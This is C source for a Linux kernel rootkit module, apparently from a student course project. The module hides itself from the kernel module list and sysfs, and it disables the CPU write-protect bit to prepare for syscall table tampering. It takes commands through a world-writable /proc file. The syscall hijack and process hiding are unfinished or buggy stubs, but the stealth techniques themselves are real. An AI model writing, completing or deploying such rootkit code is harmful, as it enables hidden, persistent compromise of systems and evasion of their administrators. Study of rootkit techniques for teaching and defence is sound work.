#define LINUX

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/proc_fs.h>
#include <linux/list.h>
#include <linux/uaccess.h>
#include <linux/spinlock_types.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/syscalls.h>
#include <linux/fcntl.h>
#include <linux/kobject.h>

#include "rootkit.h"


MODULE_LICENSE("GPL");
MODULE_AUTHOR("thanomk2");
MODULE_DESCRIPTION("CS460-project");



#define PROCFS_NAME "CS460"
#define _DEBUG_

static int get_syscall_table(void);

static ssize_t mp1_read(struct file *file, char __user *buffer, size_t count, loff_t *data);
static ssize_t mp1_write(struct file *file, const char __user *buffer, size_t count, loff_t *data);

static int parse_input(char *commands);
static int hide_process(int pid);

static void enable_write_protect(void);
static void disable_write_protect(void);

static int hide_self(void);
static int unhide_self(void);

// proc file pointers
static struct proc_dir_entry *proc_dir;
static struct proc_dir_entry *proc_dir_entry;

// Create new lock
static spinlock_t lock;

// flags
static int is_rootkit_hidden;

// Syscall table pointers
static unsigned long long syscall_table_pointer;

// Module argument
static char* sys_call_table_addr_input;
module_param(sys_call_table_addr_input, charp, 0);


// Create new process_info struct
typedef struct process_info{

  unsigned long hidden_pid;
  struct list_head list;

}process_info;

// for /proc file 
struct file_operations procFile_fops = {

    .owner = THIS_MODULE,
    .read = mp1_read,
    .write = mp1_write,

};

// Create kernel list
LIST_HEAD(procList);
LIST_HEAD(moduleList);

/* This two functions deal with the writable bit in cpu that prevent the syscall_table \
	tampering
*/
static void enable_write_protect(void){

		// we need to stop kernel to preemp these functions
		preempt_disable();

		barrier();

		// writable protect = 16th bit
        write_cr0(read_cr0() & (~ 0x10000));
}


static void disable_write_protect(void){

		preempt_enable();

		barrier();

        write_cr0(read_cr0() | 0x10000);
}


/* Idea from

	1) https://memset.wordpress.com/2011/01/20/ \
	syscall-hijacking-dynamically-obtain-syscall-table-address-kernel-2-6-x/

	2) https://d0hnuts.com/2016/12/21/basics-of-making-a-rootkit-from-syscall-to-hook/

	This function will return the address of syscall_table from the given \
	System.map-$(uname -r). In this version, we assume that the attacker will
	execute that install shellscript. 

	Note: We still have to disable the write-protection bit as well.

*/
static int get_syscall_table(void){
	
	// Should use kstrtoull() instead, but this deprecated function is cleaner
	// since we don't have to malloc new var.
	if(  (syscall_table_pointer = simple_strtoull(sys_call_table_addr_input, NULL, 16)) ){

		pr_info("get syscall_table successfull");

		pr_info("Disabling write-protection...");

		enable_write_protect();

		// TODO: ADD syscall hijack

		disable_write_protect();

		pr_info("Enabling write-protection...");

		return 0;	
	}

	pr_info("get syscall_table failed");

	return -EINVAL;	
}

static struct kobject backup_module_kobj;
static struct module this_module;
// static struct list_head *module_list;
static int hide_self(void){

	if(!is_rootkit_hidden){

		// Store previous module list_head to restore later
		// module_list = THIS_MODULE->list.prev;
		this_module = *THIS_MODULE;
		//list_add(THIS_MODULE->list.prev,&moduleList);

		// // Backup this model kernel_object
		backup_module_kobj = THIS_MODULE->mkobj.kobj;

		// Not sure how to backup this for now.
		kobject_del(&(THIS_MODULE->mkobj.kobj));
		

		list_del(&(THIS_MODULE->list));

		
		is_rootkit_hidden = 1;

		pr_info("Hide successfull.");
	}

	return 0;
}

static int unhide_self(void){

	int ret;

	if(is_rootkit_hidden){

		list_add( &(THIS_MODULE->list), &this_module.list);

		this_module.mkobj.kobj = backup_module_kobj;
	
		ret = kobject_add(&this_module.mkobj.kobj, this_module.mkobj.kobj.parent, "rootkit");

		if(ret){
			kobject_put(&this_module.mkobj.kobj);
			return -1;
		}
		


		is_rootkit_hidden = 0;

		pr_info("Unhide successfull.");

	}

	return 0;
}


static int hide_process(int pid){

	unsigned long tmpFlags;

	process_info *proc = kmalloc(sizeof(process_info), GFP_KERNEL);

	spin_lock_irqsave(&lock, tmpFlags);

		list_add(&proc->list, &procList);

	spin_unlock_irqrestore(&lock, tmpFlags);

	return 0;
}

// parse incoming input
static int parse_input(char *commands){

	int pid;
	

	if(strcmp(commands, "pid") == 0){

		// skip space
		commands = strsep(&commands, " ");

		if(  kstrtoint(commands, 10, &pid)  ){
			
			// then return error
			return -EINVAL;
		}
		else{
			// hide pid
			hide_process(pid);
		}
	}
	else if( strcmp(commands, "hide") == 0 ){

		hide_self();
	}
	else if( strcmp(commands, "unhide") == 0 ){
		
		unhide_self();
	}
	else{

		#ifdef _DEBUG_

		pr_info("Unknow command.");

		#endif /*_DEBUG_*/
	}

	return 0;

}

// write output to /proc
static ssize_t mp1_read(struct file *file, char __user *buffer, size_t count, loff_t *data){

    int copied;
    unsigned long tmpFlags;
    char *buf;
    struct process_info *currProc; // use as loop cursor
    struct process_info *n; // temp storage for loop

    // For EOF
    static int done = 0;

    if(done){
      done = 0;
      return 0;
    }

    
    done = 1;


    buf = (char *) kzalloc(count, GFP_KERNEL);
    copied = 0;

    // perform the buffer transfer
    spin_lock_irqsave(&lock, tmpFlags);

    // Should change this to return process information from procList
    list_for_each_entry_safe(currProc, n, &procList, list){

    }

    spin_unlock_irqrestore(&lock, tmpFlags);

    if(copy_to_user(buffer, buf, copied)){
        return -EFAULT;
    }

    kfree(buf);

    buf = NULL;

    return copied;
}


// Read input from /proc
static ssize_t mp1_write(struct file *file, const char __user *buffer, size_t count, loff_t *data){

    char *buf;

    buf = (char *) kzalloc(count, GFP_KERNEL);

    if(copy_from_user(buf, buffer, count)){
      return -EFAULT;
    }

    pr_info("%s\n", buf);

    parse_input(buf);

    kfree(buf);

    buf = NULL;

    return count;
}

static void initialize_var(void){

	is_rootkit_hidden = 0;
}

// mp1_init - Called when module is loaded
int __init mp1_init(void)
{
    // First create new directory under /proc
    proc_dir = proc_mkdir(PROCFS_NAME, NULL);

    if(proc_dir == NULL){
       pr_alert("Could not create /proc/%s\n", PROCFS_NAME);
       return -ENOMEM;
    }

    // create the status file under our /mp1 directory         
    proc_dir_entry = proc_create("status", 0666 , proc_dir, &procFile_fops);

    if(proc_dir_entry == NULL){

       proc_remove(proc_dir);
       pr_alert("Could not create /proc/%s/status\n", PROCFS_NAME);
       return -ENOMEM;
    }

    // initialize spin_lock
    spin_lock_init(&lock);

    initialize_var();

	get_syscall_table();

	hide_self();

    pr_alert("MP1 MODULE LOADED\n");

    return 0;   
}

// mp1_exit - Called when module is unloaded
void __exit mp1_exit(void)
{
    struct process_info *currProc;
    struct process_info *n;


    proc_remove(proc_dir_entry);
    proc_remove(proc_dir);
   
    // Delete list
    list_for_each_entry_safe(currProc, n, &procList, list){
      list_del(&currProc->list);
      kfree(currProc);
    }

    unhide_self();
   

    pr_alert("MP1 MODULE UNLOADED\n");
}

// Register init and exit funtions
module_init(mp1_init);
module_exit(mp1_exit);

